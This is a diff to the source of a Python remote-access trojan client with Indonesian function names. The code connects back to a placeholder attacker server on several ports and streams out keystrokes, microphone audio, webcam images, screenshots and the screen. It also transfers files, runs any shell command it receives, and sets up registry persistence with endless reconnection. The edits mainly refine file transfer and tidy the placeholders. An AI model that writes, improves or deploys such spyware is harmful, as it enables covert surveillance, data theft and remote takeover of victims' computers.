@@ -42,7 +42,7 @@ def send_camera_image(server_ip, port=9999):
 keyb = Controller()
 def acc_keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('[Your server ip]', 9995))
+        s.connect(('[YOUR SERVER IP]', 9995))
         while True:
             data = s.recv(1024)
             if not data:
@@ -76,8 +76,8 @@ def record_n_send():
     frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(('[Your server ip]', 9996))
-            for _ in range(0, int(RATE / CHUNK * 5)):
+            s.connect(('[YOUR SERVER IP]', 9996))
+            for _ in range(0, int(RATE / CHUNK * 10)):
                 data = stream.read(CHUNK)
                 s.sendall(data)
             print('Record done')
@@ -129,7 +129,7 @@ def send_screen_record(server_ip, port=9991):
 
 def byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('[Your server ip]', 9998))
+    sock.connect(('[YOUR SERVER IP]', 9998))
     vid = cv2.VideoCapture(0)
     while (vid.isOpened()):
         img, frame = vid.read()
@@ -150,22 +150,28 @@ def log_thread():
     t.start()
 
 def download_file(namafile):
-    file = open(namafile, 'wb')
-    sok.settimeout(1)
-    _file = sok.recv(65536*100)
-    while _file:
-        file.write(_file)
-        try:
-            _file = sok.recv(65536*100)
-        except socket.timeout as e:
-            break
-    sok.settimeout(None)
-    file.close()
+    bufsize = 65536
+    size_data = sok.recv(8)
+    filesize = struct.unpack("Q", size_data)[0]
+    recv = 0
+    with open(namafile, 'wb') as file:
+        while recv < filesize:
+                data = sok.recv(bufsize)
+                if not data:
+                    break
+                file.write(data)
+                recv += len(data)
 
 def upload_file(namafile):
-    file = open(namafile, 'rb')
-    sok.send(file.read())
-    file.close()
+    bufsize = 65536
+    filesize = os.path.getsize(namafile)
+    sok.sendall(struct.pack("Q", filesize))
+    with open(namafile, 'rb') as f:
+        while True:
+            data = f.read(bufsize)
+            if not data:
+                break
+            sok.sendall(data)
 
 def terima_perintah():
     data = ''
@@ -179,7 +185,7 @@ def terima_perintah():
 def jalankan_perintah():
     while True:
         perintah = terima_perintah()
-        if perintah == ('keluar'):
+        if perintah == ('exit', 'quit'):
             break
         if perintah == 'clear':
             pass
@@ -203,8 +209,9 @@ def jalankan_perintah():
             ss = pyautogui.screenshot()
             ss.save('ss.png')
             upload_file('ss.png')
+            os.remove("ss.png")
         elif perintah == 'screen_share':
-            send_screen_record(server_ip='[Your server ip]', port=9991)
+            send_screen_record(server_ip='[YOUR SERVER IP]', port=9991)
         elif perintah[:11] == 'persistence':
             nama_registry, file_exe = perintah[12:].split(' ')
             execute_persistence(nama_registry, file_exe)
@@ -217,9 +224,9 @@ def jalankan_perintah():
         elif perintah == 'send_key':
             acc_keystroke()
         elif perintah == 'send_mouse':
-            client.start_client(host='[Your server ip]', port=9994)
+            client.start_client(host='[YOUR SERVER IP]', port=9994)
         elif perintah == 'snap_cam':
-            send_camera_image(server_ip='[Your server ip]', port=9993)
+            send_camera_image(server_ip='[YOUR SERVER IP]', port=9993)
         else:
             exe = subprocess.Popen(
             perintah,
@@ -237,12 +244,11 @@ def execute_persist():
     while True:
         try:
             time.sleep(10)
-            sok.connect(('[Your server ip]', 9999))
+            sok.connect(('[YOUR SERVER IP]', 9999))
             jalankan_perintah()
             sok.close()
             break
         except:
             execute_persist()
-
 
 execute_persist() 
